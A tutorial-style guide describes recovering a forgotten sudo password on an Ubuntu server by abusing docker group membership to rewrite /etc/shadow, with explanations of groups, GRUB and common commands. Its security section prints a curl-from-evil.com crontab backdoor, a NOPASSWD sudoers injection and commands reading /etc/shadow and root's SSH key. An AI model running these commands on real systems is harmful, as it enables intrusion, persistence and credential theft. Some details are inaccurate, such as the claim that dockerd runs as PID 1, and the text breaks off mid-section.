# Linux Recovery & Deep Dive Guide
## The Story of How Rajneesh Got Locked Out (And Got Back In)

---

## Table of Contents
1. [What Went Wrong — The Full Timeline](#1-what-went-wrong--the-full-timeline)
2. [Q&A Deep Dive — Everything You Didn't Know](#2-qa-deep-dive--everything-you-didnt-know)
3. [The Docker Privilege Escalation — How We Fixed It](#3-the-docker-privilege-escalation--how-we-fixed-it)
4. [Deep Dive: Docker, Groups & Permissions](#4-deep-dive-docker-groups--permissions)
5. [Every Command We Used — Broken Down to Bare Bones](#5-every-command-we-used--broken-down-to-bare-bones)
6. [The HDMI/GPU Saga — Hybrid Graphics Explained](#7-the-hdmigpu-saga--hybrid-graphics-explained)
7. [Linux Essentials Guide](#8-linux-essentials-guide)

---

## 1. What Went Wrong — The Full Timeline

### The Setup
- ASUS TUF F15 laptop with Ubuntu 24.04
- Broken internal screen
- GUI removed to use as a headless server
- Only accessible via SSH from Mac
- **Forgot the sudo password**

### What You Tried (From Bash History)

```bash
# You generated random passwords using openssl
openssl rand -base64 32    # Generated: aB3dEf7hIjKlMnOpQrStUvWxYz0123456789+/ABC=
openssl rand -base64 24    # Generated: xYz1AbCdEfGhIjKlMnOpQrStUvWx

# You saved them to password.txt
# You ran passwd at some point to change your password
passwd

# But here's the problem: you changed the password AFTER saving the file
# So password.txt was STALE — it had the OLD password, not the current one
```

### Why the Blind GRUB Attempt Failed

You tried to navigate GRUB recovery mode blind (no working screen). Here's why it's nearly impossible:

1. **GRUB timing is unpredictable** — You need to hit `Shift` at EXACTLY the right moment during boot. Too early = nothing. Too late = missed it.

2. **Menu position varies** — The number of down-arrow presses depends on:
   - How many kernels are installed
   - Whether there are other OS entries
   - Ubuntu version-specific recovery menu layout

3. **No feedback loop** — Without seeing the screen, you have ZERO confirmation that:
   - GRUB menu actually appeared
   - You selected the right entry
   - Recovery mode loaded
   - Root shell is ready for input

4. **Recovery menu has a confirmation step** — Ubuntu 24.04's recovery menu often asks "Press Enter for maintenance" which is easy to miss blind.

**Lesson:** Blind GRUB is a last resort. If you have Docker/LXD access, use that instead.

### Why `password.txt` Didn't Work

```
Machine: aB3dEf7hIjKlMnOpQrStUvWxYz0123456789+/ABC=
SSH: xYz1AbCdEfGhIjKlMnOpQrStUvWx
```

- These were **raw `openssl rand` outputs** — the actual random strings you generated
- You used one as the machine password and one for SSH key passphrase
- **But you later changed your sudo password to `MyP@ssw0rd123` and never updated the file**
- The `=` and `/` and `+` characters also cause copy-paste issues in terminals

---

## 2. Q&A Deep Dive — Everything You Didn't Know

### Q: What is `/etc/shadow` and why does it matter?

**A:** `/etc/shadow` is THE file where Linux stores password hashes for every user.

```
rajneesh-mishra:$6$randomsalt$longhashhere...:19589:0:99999:7:::
│                │                              │
│                │                              └── Password age/expiry info
│                └── The hashed password (SHA-512 in this case)
└── Username
```

- Only `root` can read/write this file (permissions: `640`)
- Passwords are **hashed**, not encrypted — you can't reverse them
- `$6$` means SHA-512 hashing algorithm
- When you type your password for `sudo`, Linux hashes your input and compares it to this file

### Q: What are Linux groups and why do they matter?

**A:** Groups are how Linux controls access to resources.

```bash
$ id
uid=1000(rajneesh-mishra) gid=1000(rajneesh-mishra) groups=1000(rajneesh-mishra),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),100(users),114(lpadmin),984(docker)
```

Here's what your groups mean:

| Group | What It Gives You |
|-------|------------------|
| `rajneesh-mishra` | Your personal group (every user gets one) |
| `adm` | Read system logs (`/var/log/syslog`, etc.) |
| `cdrom` | Access CD/DVD drives |
| `sudo` | Permission to USE `sudo` (but still need password!) |
| `dip` | Network dial-up access (legacy) |
| `plugdev` | Mount/unmount removable devices |
| `users` | General users group |
| `lpadmin` | Manage printers |
| `docker` | Run Docker commands WITHOUT sudo — **THIS IS THE ONE THAT SAVED YOU** |

### Q: Why does the `docker` group = root access?

**A:** This is a well-known security consideration. Here's why:

```bash
# Docker daemon runs as ROOT
# When you're in the docker group, you can talk to the daemon
# Docker can mount ANY directory from the host into a container
# Inside the container, you ARE root

# So you can do things like:
docker run -v /:/hostroot --rm ubuntu cat /hostroot/etc/shadow
# ^ This reads the shadow file as root, bypassing all permissions

docker run -v /:/hostroot --rm ubuntu bash -c "echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /hostroot/etc/sudoers"
# ^ This would give any user passwordless sudo (DON'T DO THIS, just an example)
```

**The chain:**
1. You're in `docker` group -> can run Docker
2. Docker runs as `root` -> containers have root powers
3. Containers can mount host files -> root-level file access
4. Edit `/etc/shadow` -> change any password

**Security takeaway:** Only add TRUSTED users to the `docker` group. It's equivalent to giving them root.

### Q: What is `sudo` vs `su` vs `root`?

**A:**

```
root     = The actual superuser account (UID 0). God mode.
su       = "Switch User" — logs you in AS another user (default: root)
             Requires the TARGET user's password
             Example: `su -` asks for ROOT's password
sudo     = "Superuser Do" — runs ONE command as root
             Requires YOUR OWN password
             Must be in the sudo group
```

Why `sudo` is preferred over `su`:
- Logs every command (audit trail)
- Temporary elevation (not a persistent root shell)
- Each user uses their own password
- Can be configured per-user in `/etc/sudoers`

### Q: What is GRUB and how does it work?

**A:** GRUB (GRand Unified Bootloader) is the first thing that runs when your computer starts.

```
Power On -> BIOS/UEFI -> GRUB -> Linux Kernel -> systemd -> Login
```

GRUB's job:
1. Show you a menu of operating systems/kernels
2. Let you pick which one to boot
3. Pass parameters to the kernel (like `video=eDP-1:d`)

Key files:
```
/etc/default/grub          # Your config (human-editable)
/boot/grub/grub.cfg        # Generated config (DON'T edit directly)
sudo update-grub           # Regenerates grub.cfg from your config
```

The line we changed:
```bash
GRUB_CMDLINE_LINUX_DEFAULT="quiet splash video=eDP-1:d video=HDMI-A-1:e"
#                                         │              │
#                                         │              └── Enable HDMI
#                                         └── Disable internal display (eDP)
```

### Q: What is `eDP` vs `HDMI` vs `DP`?

**A:** These are display connector types:

```
eDP     = Embedded DisplayPort — the INTERNAL laptop screen
            Always card1 (Intel GPU) on your laptop
HDMI    = High-Definition Multimedia Interface — external
            On card2 (NVIDIA GPU) on your laptop
DP      = DisplayPort — another external connector type
```

### Q: What is a hybrid GPU laptop?

**A:** Your ASUS TUF F15 has TWO GPUs:

```
Intel UHD Graphics (card1)     = Integrated GPU
├── Low power, always on
├── Drives the internal screen (eDP-1)
└── Handles basic display tasks

NVIDIA GTX/RTX (card2)         = Discrete GPU
├── High power, high performance
├── Drives HDMI output (HDMI-A-1)
├── Used for gaming/rendering
└── Can be turned off to save battery
```

This is why the kernel parameter `video=HDMI-A-1:e` alone wasn't enough — the NVIDIA driver uses its own naming (`HDMI-1-0`), and the display was being managed by Xorg/NVIDIA, not the raw kernel framebuffer.

### Q: What is GDM?

**A:** GDM = GNOME Display Manager. It's the login screen.

```
systemd starts -> gdm3.service starts -> Shows login screen -> You log in -> GNOME desktop loads
```

Other display managers: LightDM, SDDM (KDE), etc.

Key commands:
```bash
systemctl status gdm3          # Check if it's running
systemctl enable gdm3           # Start on boot
systemctl disable gdm3          # Don't start on boot (headless mode)
systemctl set-default graphical.target    # Boot into GUI
systemctl set-default multi-user.target   # Boot into terminal only
```

### Q: What is systemd?

**A:** systemd is the "init system" — the FIRST process that runs after the kernel boots (PID 1). It manages everything:

```bash
systemctl status <service>      # Check service status
systemctl start <service>       # Start a service NOW
systemctl stop <service>        # Stop a service NOW
systemctl enable <service>      # Start on boot
systemctl disable <service>     # Don't start on boot
systemctl restart <service>     # Restart a service
journalctl -u <service>         # View service logs
```

### Q: What is `/sys/class/drm/` and why did we look there?

**A:** `/sys/` is a virtual filesystem that exposes kernel information. It doesn't exist on disk — it's generated by the kernel in real-time.

```
/sys/class/drm/
├── card1-eDP-1/
│   ├── status      # "connected" or "disconnected"
│   ├── enabled     # "enabled" or "disabled"
│   └── modes       # Supported resolutions
├── card2-HDMI-A-1/
│   ├── status      # "connected" — your external monitor
│   ├── enabled     # Was "disabled" initially
│   └── modes       # 1920x1080, etc.
└── card2-DP-1/
    └── status      # "disconnected"
```

### Q: Why couldn't we write to `/sys/class/drm/.../enabled`?

**A:** Some sysfs files are read-only even for root. The DRM (Direct Rendering Manager) subsystem doesn't allow manually toggling displays through sysfs on NVIDIA cards — you need to use the NVIDIA driver or Xorg to manage displays.

### Q: What does `openssl passwd -6` do?

**A:**

```bash
openssl passwd -6 mypassword
# Output: $6$randomsalt$verylonghash...
#          │   │           │
#          │   │           └── SHA-512 hash of your password + salt
#          │   └── Random salt (prevents rainbow table attacks)
#          └── Algorithm identifier (6 = SHA-512)
```

This generates a hash in the EXACT format that `/etc/shadow` expects. That's why we could `sed` it directly into the shadow file.

### Q: What did the final fix command actually do?

**A:**

```bash
# Step 1: Generate the password hash on the host
HASH=$(openssl passwd -6 MyP@ssw0rd123)
# HASH now contains something like: $6$xyz$abc...

# Step 2: Use Docker to edit /etc/shadow
docker run \
  -v /etc:/mnt \          # Mount host's /etc at /mnt inside container
  --rm \                   # Delete container after it exits
  ubuntu \                 # Use Ubuntu base image
  sed -i \                 # Edit file in-place
  "s|rajneesh-mishra:[^:]*|rajneesh-mishra:$HASH|" \
  #  │                │                     │
  #  │                │                     └── Replace with: username:newhash
  #  │                └── Match everything until the next colon (the old hash)
  #  └── Find the line starting with your username
  /mnt/shadow              # The shadow file (mounted from host)
```

---

## 3. The Docker Privilege Escalation — How We Fixed It

### The Problem
```
You know your username:     rajneesh-mishra  ✅
You have SSH access:        yes              ✅
You can run sudo:           no               ❌ (forgot password)
You're in docker group:     yes              ✅  <-- THE KEY
```

### The Solution (Step by Step)

```bash
# 1. Generate a SHA-512 password hash
#    openssl IS available on the host (unlike inside the minimal Docker image)
HASH=$(openssl passwd -6 MyP@ssw0rd123)

# 2. Use Docker to mount /etc and replace the password hash
#    Docker runs as root, so it CAN modify /etc/shadow
docker run -v /etc:/mnt --rm ubuntu sed -i "s|rajneesh-mishra:[^:]*|rajneesh-mishra:$HASH|" /mnt/shadow

# 3. Verify
sudo whoami    # Enter: MyP@ssw0rd123
# Output: root   ✅
```

### Why Each Failed Attempt Failed

| Attempt | Command | Why It Failed |
|---------|---------|---------------|
| 1 | `docker run -v /etc:/mnt --rm -it ubuntu chpasswd` | `-it` with piped input = "not a TTY" error |
| 2 | `docker run ... chpasswd --root /mnt` | PAM (authentication module) not configured in container |
| 3 | `docker run ... chpasswd -e` with shadow mount only | User doesn't exist inside container (no `/etc/passwd`) |
| 4 | Generate hash inside container with `openssl` | Minimal Ubuntu image doesn't include `openssl` |
| 5 | Generate hash on HOST, `sed` inside container | **WORKED!** |

### Lessons Learned

1. **Minimal Docker images lack tools** — `ubuntu:latest` doesn't have `openssl`, `vim`, etc.
2. **`chpasswd` needs PAM** — PAM is the authentication framework; Docker containers don't have host PAM config
3. **`sed` is always available** — Even in minimal images, basic coreutils exist
4. **Generate on host, apply in container** — Best pattern for this kind of hack

---

## 4. Deep Dive: Docker, Groups & Permissions

### What Exactly IS a Group in Linux?

Think of a group as a **badge**. When you wear a badge, you get access to certain rooms. In Linux, files and programs check your badges (groups) to decide if you're allowed in.

Every file and directory in Linux has THREE permission levels:

```
-rwxr-x--- 1 rajneesh-mishra docker 4096 Mar 20 19:00 somefile
 │││ │││ │││   │                │
 │││ │││ │││   │                └── GROUP owner (the "docker" badge)
 │││ │││ │││   └── USER owner
 │││ │││ └└└── Others (everyone else): no access (---)
 │││ └└└── Group members: read + execute (r-x)
 └└└── Owner: read + write + execute (rwx)
```

So if a file is owned by group `docker`, anyone wearing the `docker` badge can access it according to the group permissions.

### Where Do Groups Live?

Groups are defined in `/etc/group`:

```
# Format: group_name:password:GID:member_list
sudo:x:27:rajneesh-mishra
docker:x:984:rajneesh-mishra
adm:x:4:syslog,rajneesh-mishra
```

Every group has:
- A **name** (`docker`)
- A **GID** (Group ID number, like `984`)
- A **member list** (comma-separated usernames)

### How to Manage Groups

#### See your groups
```bash
id                              # Full details: UID, GID, all groups
groups                          # Just the group names
groups rajneesh-mishra          # Check another user's groups
cat /etc/group | grep docker    # See who's in the docker group
```

#### Add a user to a group
```bash
sudo usermod -aG docker username
#            ││
#            │└── Group name
#            └── "append to Groups" — CRITICAL: without -a it REPLACES all groups!

# Example: Give someone Docker access
sudo usermod -aG docker john

# Give someone sudo access
sudo usermod -aG sudo john
```

**WARNING:** Always use `-aG` (append), never just `-G`. Using `-G` alone REMOVES the user from ALL other groups and only puts them in the one you specified. This can lock people out completely.

#### Remove a user from a group
```bash
sudo gpasswd -d username groupname

# Example: Revoke Docker access
sudo gpasswd -d john docker

# Verify
groups john    # "docker" should be gone
```

#### Create a new group
```bash
sudo groupadd mygroup

# Create with specific GID
sudo groupadd -g 1500 mygroup
```

#### Delete a group
```bash
sudo groupdel mygroup
```

#### Changes take effect on next login
After adding/removing groups, the user must **log out and log back in** (or start a new SSH session) for changes to take effect. To verify without logging out:
```bash
# Start a new shell with updated groups
newgrp docker
```

### How Did the Docker Group Get On Your Server?

When you installed Docker on your ASUS server, the installation script did this automatically:

```bash
# What "apt install docker-ce" does behind the scenes:
groupadd docker           # Creates the docker group
# Sets up /var/run/docker.sock owned by root:docker with permissions 660
```

Then at some point, either the installer or YOU ran:
```bash
sudo usermod -aG docker rajneesh-mishra
```

This added you to the docker group so you could run `docker` commands without typing `sudo` every time.

You probably followed a Docker installation guide that told you to run this. It's a very common step — almost every Docker tutorial includes it.

### How Docker ACTUALLY Works Under the Hood

```
┌─────────────────────────────────────────────────────────┐
│                    YOUR SERVER                           │
│                                                          │
│   ┌──────────────┐         ┌─────────────────────────┐  │
│   │ Your SSH      │         │  Docker Daemon           │  │
│   │ Session       │         │  (dockerd)               │  │
│   │               │         │                          │  │
│   │ Runs as:      │  talks  │  Runs as: ROOT (PID 1!) │  │
│   │ rajneesh-     │ ──────> │                          │  │
│   │ mishra        │   via   │  Listens on:             │  │
│   │               │ socket  │  /var/run/docker.sock    │  │
│   └──────────────┘         │                          │  │
│                             │  This socket file has:   │  │
│                             │  Owner: root             │  │
│                             │  Group: docker           │  │
│                             │  Perms: srw-rw---- (660) │  │
│                             └──────────┬──────────────┘  │
│                                        │                  │
│                                        │ creates          │
│                                        ▼                  │
│                    ┌──────────────────────────────┐       │
│                    │  Container                    │       │
│                    │  Runs as: ROOT inside         │       │
│                    │                               │       │
│                    │  Can see: whatever you mount  │       │
│                    │  with -v /host/path:/inside   │       │
│                    └──────────────────────────────┘       │
└─────────────────────────────────────────────────────────┘
```

The magic is the **socket file**: `/var/run/docker.sock`

```bash
ls -la /var/run/docker.sock
# srw-rw---- 1 root docker 0 Mar 20 19:49 /var/run/docker.sock
#  ││  ││
#  ││  └└── Group (docker): read + write
#  └└── Owner (root): read + write
#  Others: NOTHING
```

- The socket is owned by `root:docker`
- Group permissions are `rw-` (read + write)
- If you're in the `docker` group, you can talk to this socket
- Talking to this socket = telling the Docker daemon what to do
- The Docker daemon runs as ROOT and does whatever you ask

**That's the entire privilege escalation chain:**
```
You (regular user)
  └── in docker group
       └── can write to docker.sock
            └── can tell dockerd to do things
                 └── dockerd runs as root
                      └── dockerd creates containers as root
                           └── containers can mount host files
                                └── you have root file access
```

### The Actual Attack We Used (Step by Step)

```bash
# What you typed:
HASH=$(openssl passwd -6 MyP@ssw0rd123)
docker run -v /etc:/mnt --rm ubuntu sed -i "s|rajneesh-mishra:[^:]*|rajneesh-mishra:$HASH|" /mnt/shadow
```

Here's what happened at each stage:

```
Step 1: openssl passwd -6 MyP@ssw0rd123
┌──────────────────────────────────┐
│ Your shell (as rajneesh-mishra)  │
│                                  │
│ openssl takes "MyP@ssw0rd123" and:      │
│ 1. Generates random salt         │
│ 2. Hashes password with SHA-512  │
│ 3. Outputs: $6$salt$hash...      │
│                                  │
│ Stored in $HASH variable         │
└──────────────────────────────────┘

Step 2: docker run -v /etc:/mnt ...
┌──────────────────────────────────┐
│ Your shell sends request to      │
│ /var/run/docker.sock:            │
│                                  │
│ "Hey dockerd, please:            │
│  1. Download ubuntu image        │
│  2. Create a container           │
│  3. Mount /etc at /mnt inside    │
│  4. Run this sed command          │
│  5. Delete container when done"  │
└──────────┬───────────────────────┘
           │
           ▼
┌──────────────────────────────────┐
│ Docker daemon (running as ROOT)  │
│                                  │
│ "Sure! I'll:                     │
│  1. Create container as root     │
│  2. Bind /etc to /mnt            │
│  3. Run sed as root inside"      │
└──────────┬───────────────────────┘
           │
           ▼
┌──────────────────────────────────────────┐
│ Container (running as ROOT)              │
│                                          │
│ sed -i "s|rajneesh-mishra:OLDHASH|       │
│          rajneesh-mishra:NEWHASH|"       │
│     /mnt/shadow                          │
│     ↑                                    │
│     This is actually /etc/shadow on the  │
│     HOST because of the -v mount!        │
│                                          │
│ sed opens the file as ROOT → CAN write   │
│ Replaces old hash with new hash          │
│ Saves file                               │
└──────────────────────────────────────────┘

Step 3: You type "sudo whoami" with password "MyP@ssw0rd123"
┌──────────────────────────────────┐
│ sudo reads /etc/shadow           │
│ Finds: rajneesh-mishra:$6$...    │
│ Hashes "MyP@ssw0rd123" with same salt   │
│ Compares → MATCH!                │
│ Grants root access               │
│ Output: root                     │
└──────────────────────────────────┘
```

### Docker on Your Mac — How Is It Different?

On macOS, Docker works **completely differently** from Linux:

```
Linux (your ASUS server):
┌───────────────────────┐
│ Linux Kernel           │
│ └── dockerd (native)  │
│     └── containers    │
│         (share kernel) │
└───────────────────────┘
Containers run DIRECTLY on the host kernel.
-v mounts give REAL access to host files.
docker group = root access.

macOS (your Mac):
┌──────────────────────────────────┐
│ macOS                             │
│ └── Docker Desktop app           │
│     └── Linux VM (hidden)        │
│         └── dockerd              │
│             └── containers       │
└──────────────────────────────────┘
Docker runs inside a hidden Linux VM.
-v mounts go through the VM layer.
There IS no docker group on macOS.
```

#### To check who can use Docker on your Mac:
```bash
# Docker Desktop on macOS doesn't use groups
# Anyone who can open Docker Desktop can use it
# Check if Docker is accessible:
docker info

# On macOS, Docker permission is controlled by:
# 1. Who installed Docker Desktop
# 2. macOS user account permissions
# 3. Docker Desktop settings (Settings → Advanced → "Allow the default Docker socket to be used")
```

#### On Linux (your ASUS server) — check Docker access:
```bash
# See who's in the docker group (= who has Docker access)
getent group docker
# Output: docker:x:984:rajneesh-mishra

# Or:
grep docker /etc/group

# Add someone:
sudo usermod -aG docker newuser

# Remove someone:
sudo gpasswd -d newuser docker
```

### Why This Matters for Security

```
╔══════════════════════════════════════════════════════════╗
║  THE DOCKER GROUP SECURITY SPECTRUM                      ║
╠══════════════════════════════════════════════════════════╣
║                                                          ║
║  sudo group     →  Can do ANYTHING but needs password   ║
║  docker group   →  Can do ANYTHING without password!    ║
║  regular user   →  Can only touch their own files       ║
║                                                          ║
║  docker group is MORE dangerous than sudo because:      ║
║  • sudo requires authentication                         ║
║  • sudo logs every command to /var/log/auth.log         ║
║  • sudo can be configured to limit commands             ║
║  • docker has NO logging, NO restrictions, NO password  ║
║                                                          ║
╚══════════════════════════════════════════════════════════╝
```

Things someone in the docker group can do **without knowing any password**:

```bash
# Read ANY file on the system
docker run -v /:/host --rm ubuntu cat /host/etc/shadow
docker run -v /:/host --rm ubuntu cat /host/root/.ssh/id_rsa

# Write to ANY file
docker run -v /:/host --rm ubuntu bash -c "echo 'hacker ALL=(ALL) NOPASSWD:ALL' >> /host/etc/sudoers"

# Install a backdoor
docker run -v /:/host --rm ubuntu bash -c "echo '* * * * * root curl http://evil.com/shell.sh | bash' >> /host/etc/crontab"

# Change root password
docker run -v /:/host --rm ubuntu bash -c "echo 'root:hacked' | chpasswd --root /host"
```

### Alternatives to the Docker Group

If you want people to use Docker without giving them full root:

```bash
# Option 1: Rootless Docker (recommended)
# Each user runs their own Docker daemon without root
dockerd-rootless-setuptool.sh install

# Option 2: Use sudo for docker (explicit, logged)
# Don't add them to docker group, make them use:
sudo docker run ...

# Option 3: Podman (drop-in Docker replacement, rootless by default)
sudo apt install podman
podman run ubuntu echo "no root needed, no group needed"
```

---

## 5. Every Command We Used — Broken Down to Bare Bones

Every single command from our recovery session, dissected so you never need to ask again.

---

### `id`
**What it does:** Shows your user ID, group ID, and all groups you belong to.

```bash
id
# uid=1000(rajneesh-mishra) gid=1000(rajneesh-mishra) groups=1000(rajneesh-mishra),27(sudo),984(docker)
```

| Part | Meaning |
|------|---------|
| `uid=1000` | Your User ID number. root is always 0. |
| `gid=1000` | Your Primary Group ID |
| `groups=...` | Every group you're in (your "badges") |

No flags needed. Just `id`. That's it.

```bash
id                    # Your info
id rajneesh-mishra    # Someone else's info (takes username as argument)
id -u                 # Just the UID number
id -g                 # Just the primary GID number
id -Gn                # Just group names, space-separated
```

---

### `cat`
**What it does:** Prints file contents to the terminal. Short for "concatenate".

```bash
cat /etc/os-release
cat ~/password.txt
```

| Usage | What happens |
|-------|-------------|
| `cat file` | Print entire file |
| `cat file1 file2` | Print both files, one after another (this is the "concatenate" part) |
| `cat -n file` | Print with line numbers |

We used it to read:
```bash
cat ~/password.txt                    # Check saved passwords
cat /etc/os-release                   # Check Ubuntu version
cat /sys/class/drm/*/status           # Check display connection status
cat /sys/class/drm/*/enabled          # Check if displays are enabled
cat /sys/class/drm/card1-eDP-1/enabled  # Check specific display
```

---

### `grep`
**What it does:** Searches for patterns in text. Like Ctrl+F but for the terminal.

```bash
grep "pattern" file
```

| Flag | What it does | Example |
|------|-------------|---------|
| `-r` | **Recursive** — search all files in directories | `grep -r "password" ~/` |
| `-i` | **Case insensitive** — "Error" matches "error" | `grep -i "error" log.txt` |
| `-n` | Show **line numbers** | `grep -n "TODO" code.py` |
| `-v` | **Invert** — show lines that DON'T match | `grep -v "^#" config` (skip comments) |
| `-l` | Just show **filenames**, not content | `grep -rl "secret" ~/` |

We used it:
```bash
cat /etc/os-release | grep VERSION       # Find lines containing "VERSION"
dpkg -l | grep gdm                       # Check if gdm is installed
grep -r "password.txt" ~/                # Find any file referencing password.txt
grep -r "decrypt\|openssl\|gpg" ~/       # Search for multiple patterns (\| = OR)
cat ~/.bash_history | grep -i "pass"     # Search history for password-related commands
ls -la /sys/class/drm/ | grep card       # Filter ls output for "card" entries
```

The **pipe** `|` sends one command's output as input to grep:
```bash
command | grep "filter"
#  │        │
#  │        └── Only show lines matching "filter"
#  └── Run this command, but don't print its output directly
```

---

### `ls`
**What it does:** Lists files and directories.

```bash
ls              # Basic listing
ls -la          # The one you'll use 90% of the time
```

| Flag | What it does |
|------|-------------|
| `-l` | **Long format** — shows permissions, owner, size, date |
| `-a` | **All** — includes hidden files (starting with `.`) |
| `-la` | Both combined (most common usage) |
| `-h` | **Human-readable** sizes (1K, 2M, 3G instead of bytes) |
| `-R` | **Recursive** — list subdirectories too |

We used it:
```bash
ls -la ~/                              # List everything in home directory
ls -la ~/.config/                      # Check config directory
ls -la /sys/class/drm/ | grep card     # List display devices
ls -la /etc/cron.d/                    # Check cron directories
```

Reading the output:
```
-rwxr-x--- 1 rajneesh-mishra docker 4096 Mar 20 19:00 somefile
│││││││││  │ │                │      │    │             │
│││││││││  │ │                │      │    │             └── Filename
│││││││││  │ │                │      │    └── Last modified date
│││││││││  │ │                │      └── Size in bytes
│││││││││  │ │                └── Group owner
│││││││││  │ └── User owner
│││││││││  └── Number of hard links
│││││││││
│││ │││ └└└── Others: r-x (read + execute, no write)
│││ └└└── Group: r-x (read + execute, no write)
└└└── Owner: rwx (read + write + execute)
│
└── File type: - = file, d = directory, l = symlink
```

---

### `which`
**What it does:** Shows the full path of a command.

```bash
which pkexec
# /usr/bin/pkexec
```

We used it to check if `pkexec` was available as an alternative to `sudo`. It was, but it also needs a password.

---

### `echo`
**What it does:** Prints text to the terminal.

```bash
echo "hello"              # Prints: hello
echo $HOME                # Prints the value of $HOME variable
```

But its real power is **piping output to other commands**:

```bash
echo "rajneesh-mishra:MyP@ssw0rd123" | docker run ...
#     │                         │
#     │                         └── Receives this text as input (stdin)
#     └── This text gets sent through the pipe
```

We used it:
```bash
# Pipe password to sudo (avoids terminal input issues)
echo 'aB3dEf7hIjKlMnOpQrStUvWxYz0123456789+/ABC=' | sudo -S whoami

# Pipe username:password to Docker for chpasswd
echo "rajneesh-mishra:MyP@ssw0rd123" | docker run -v /etc:/mnt --rm -i ubuntu chpasswd --root /mnt

# Write to a sysfs file
echo "enabled" | sudo tee /sys/class/drm/card2-HDMI-A-1/enabled
```

---

### `sudo`
**What it does:** Run a command as root (superuser).

```bash
sudo command          # Run command as root
```

| Flag | What it does |
|------|-------------|
| `-S` | Read password from **stdin** (pipe) instead of terminal |
| `-l` | **List** what you're allowed to do with sudo |
| `-u user` | Run as a **specific user** (not root) |
| `-i` | Start a **root shell** (interactive) |

We used it:
```bash
sudo whoami                    # Test if sudo works (should print "root")
sudo -l                        # List sudo permissions (needed password though)
echo 'password' | sudo -S whoami  # Feed password via pipe with -S flag
sudo apt update                # Run apt as root
sudo nano /etc/default/grub    # Edit system file as root
sudo update-grub               # Regenerate GRUB config as root
sudo reboot                    # Reboot the system
```

**The `-S` flag** is key — normally `sudo` reads the password from the terminal directly (you can't pipe to it). `-S` tells it "read from stdin instead", which lets you do `echo 'pass' | sudo -S command`.

---

### `tee`
**What it does:** Reads from stdin and writes to BOTH the terminal AND a file.

```bash
echo "text" | tee filename
```

Why not just use `>` (redirect)?
```bash
# This FAILS:
sudo echo "text" > /protected/file
# Because > is handled by YOUR shell (not root), so permission denied

# This WORKS:
echo "text" | sudo tee /protected/file
# Because tee runs as root (via sudo) and does the writing
```

We used it:
```bash
echo "enabled" | sudo tee /sys/class/drm/card2-HDMI-A-1/enabled
# Tried to write "enabled" to the display sysfs file (it was read-only though)
```

---

### `openssl passwd`
**What it does:** Generates a password hash.

```bash
openssl passwd -6 mypassword
# Output: $6$randomsalt$longhashstring...
```

| Flag | What it does |
|------|-------------|
| `-6` | Use **SHA-512** algorithm (most secure, used by modern Linux) |
| `-5` | Use SHA-256 |
| `-1` | Use MD5 (old, insecure) |

The output format:
```
$6$salt$hash
 │  │    │
 │  │    └── The actual hash of your password + salt
 │  └── Random salt (prevents rainbow table attacks)
 └── Algorithm identifier (6 = SHA-512)
```

We used it:
```bash
HASH=$(openssl passwd -6 MyP@ssw0rd123)
# 1. Takes "MyP@ssw0rd123" as the password
# 2. Generates a random salt
# 3. Hashes password+salt with SHA-512
# 4. Stores result in $HASH variable
# 5. This hash goes directly into /etc/shadow
```

**`$(...)` is command substitution:**
```bash
HASH=$(openssl passwd -6 MyP@ssw0rd123)
#     │                          │
#     └── Run this command ──────┘
#         and store its output in HASH
```

---

### `docker run`
**What it does:** Creates and starts a new container.

```bash
docker run [OPTIONS] IMAGE [COMMAND]
```

| Flag | What it does |
|------|-------------|
| `-v /host:/container` | **Volume mount** — maps a host directory into the container |
| `--rm` | **Remove** container automatically after it exits |
| `-i` | **Interactive** — keep stdin open (needed for piping input) |
| `-t` | **TTY** — allocate a terminal (needed for interactive shells) |
| `-it` | Both together — for interactive use |
| `-d` | **Detached** — run in background |
| `--name foo` | Give the container a name |
| `-e VAR=val` | Set **environment variable** |
| `-p 8080:80` | **Port mapping** — host:container |

We used it in several forms:

```bash
# Form 1: Pipe input (FAILED because of -it with pipe)
echo "rajneesh-mishra:MyP@ssw0rd123" | docker run -v /etc:/mnt --rm -it ubuntu chpasswd --root /mnt
# -it expects a terminal, but we're piping — conflict! Remove -t.

# Form 2: Pipe input (FIXED)
echo "rajneesh-mishra:MyP@ssw0rd123" | docker run -v /etc:/mnt --rm -i ubuntu chpasswd --root /mnt
# -i only: accepts piped input without needing a terminal

# Form 3: Run a command directly (THE ONE THAT WORKED)
docker run -v /etc:/mnt --rm ubuntu sed -i "s|old|new|" /mnt/shadow
```

**The `-v` flag is the dangerous one:**
```bash
-v /etc:/mnt
#  │     │
#  │     └── Path INSIDE the container where it appears
#  └── Path on the HOST that gets mounted

# Inside the container:
#   /mnt/shadow  ──is actually──>  /etc/shadow on the host
#   /mnt/passwd  ──is actually──>  /etc/passwd on the host
```

---

### `sed`
**What it does:** Stream editor — finds and replaces text in files.

```bash
sed 's|find|replace|' file        # Print result (don't modify file)
sed -i 's|find|replace|' file     # Modify file IN-PLACE
```

| Flag | What it does |
|------|-------------|
| `-i` | **In-place** — actually modify the file (without this, it just prints) |

The substitution pattern:
```
s|pattern|replacement|
│ │       │
│ │       └── What to put there instead
│ └── What to find (supports regex)
└── "s" = substitute command
```

You can use any delimiter — `s/find/replace/` or `s|find|replace|` or `s#find#replace#`. We used `|` because the hash contains `/` characters.

We used it:
```bash
sed -i "s|rajneesh-mishra:[^:]*|rajneesh-mishra:$HASH|" /mnt/shadow
#        │                 │                    │
#        │                 │                    └── Replace with: username:newhash
#        │                 └── [^:]* means "match everything that's NOT a colon"
#        │                     This captures the entire old password hash
#        └── Find line starting with your username followed by colon
```

The regex `[^:]*`:
```
[^:]  = any character that is NOT a colon
*     = zero or more of the previous character
[^:]* = keep matching until you hit a colon

/etc/shadow format:
rajneesh-mishra:$6$salt$hash:19957:0:99999:7:::
│               │             │
│               │             └── This colon STOPS the [^:]* match
│               └── This is what [^:]* captures (the hash)
└── This is what "rajneesh-mishra:" matches
```

---

### `dpkg -l`
**What it does:** Lists all installed Debian packages.

```bash
dpkg -l                # List ALL packages
dpkg -l | grep gdm     # Find specific package
```

| Flag | What it does |
|------|-------------|
| `-l` | **List** installed packages |
| `-i` | **Install** a .deb file |
| `-r` | **Remove** a package |
| `-s package` | **Status** of a specific package |

We used it:
```bash
dpkg -l | grep gdm     # Check if GDM (display manager) was installed
# Output showed "ii" at the start = installed
# ii = installed, rc = removed but config remains, un = not installed
```

---

### `systemctl`
**What it does:** Controls systemd services (background programs).

```bash
systemctl [action] [service-name]
```

| Action | What it does |
|--------|-------------|
| `status` | Show if service is running, its PID, recent logs |
| `start` | Start the service now |
| `stop` | Stop the service now |
| `restart` | Stop and start again |
